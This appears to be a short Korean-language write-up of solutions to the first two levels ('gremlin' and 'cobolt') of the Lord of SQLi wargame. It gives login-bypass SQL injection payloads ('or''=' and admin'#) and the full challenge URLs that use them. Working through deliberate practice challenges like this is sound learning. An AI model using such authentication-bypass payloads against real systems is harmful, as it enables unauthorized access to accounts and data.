1 gremlin
====
* 기초적인 sql injection 구문
    * 목적: select id from prob_gremlin where id='admin' and pw=''or''=''을 구현하자
* id: admin
* pw: 'or''='
* 답: https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=admin&pw=%27or%27%27=%27

2 cobolt
====
* admin'#을 전달해주면, pw를 고려하지 않아도 된다.
* md5로 암호화를 고려하고 싶지 않다.
* 답: https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin%27%23

